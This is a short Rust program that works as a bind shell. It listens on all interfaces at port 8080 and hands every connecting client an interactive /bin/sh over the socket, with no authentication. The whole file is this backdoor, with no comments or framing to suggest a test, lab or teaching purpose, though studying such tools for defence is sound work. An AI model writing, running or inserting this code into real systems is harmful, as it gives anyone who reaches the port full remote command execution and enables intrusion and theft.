use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::process::Command;

fn main() {
    let listener = TcpListener::bind("0.0.0.0:8080").unwrap();
    println!("Server started on port 8080");

    for stream in listener.incoming() {
        match stream {
            Ok(mut stream) => {
                println!("New client connected: {}", stream.peer_addr().unwrap());

                let mut cmd = Command::new("/bin/sh");
                cmd.arg("-i");
                cmd.stdin(std::process::Stdio::from(stream.try_clone().unwrap()));
                cmd.stdout(std::process::Stdio::from(stream.try_clone().unwrap()));
                cmd.stderr(std::process::Stdio::from(stream.try_clone().unwrap()));
                cmd.spawn().unwrap();
            }
            Err(e) => {
                println!("Error connecting to client: {}", e);
            }
        }
    }
}
